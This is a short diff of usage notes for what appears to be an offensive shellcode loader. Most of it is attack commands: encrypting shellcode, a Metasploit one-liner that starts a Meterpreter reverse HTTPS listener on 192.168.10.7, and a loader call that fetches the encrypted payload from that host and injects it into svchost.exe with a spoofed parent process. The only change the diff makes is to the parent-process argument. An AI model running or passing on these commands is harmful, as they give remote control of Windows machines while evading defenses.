@@ -5,4 +5,4 @@ encrypt.py shellcode.bin -p 'password1' -o enc
 
 msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.10.7; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads false; set StagerVerifySSLCert true; run -j'
 
-SODYNAMiC.exe /sc:"http://192.168.10.7/enc" /password:"password1" /image:"C:\Windows\System32\svchost.exe" /ppid:"explorer" /blockDlls:"False" /am51:"False"
+SODYNAMiC.exe /sc:"http://192.168.10.7/enc" /password:"password1" /image:"C:\Windows\System32\svchost.exe" /ppid:0 /blockDlls:"False" /am51:"False"
